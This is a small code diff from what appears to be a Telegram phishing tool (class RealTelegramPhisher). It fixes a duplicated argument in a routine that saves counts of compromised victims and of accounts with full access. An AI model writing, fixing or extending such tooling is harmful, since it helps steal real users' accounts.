@@ -304,7 +304,7 @@ class RealTelegramPhisher:
                     'total_compromised': len(VICTIMS_DATA),
                     'last_update': datetime.now().isoformat(),
                     'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')])
-                }, f, ensure_ascii=False, indent=2, ensure_ascii=False)
+                }, f, ensure_ascii=False, indent=2)
         except Exception as e:
             logger.error(f"❌ Ошибка сохранения данных: {e}")
 
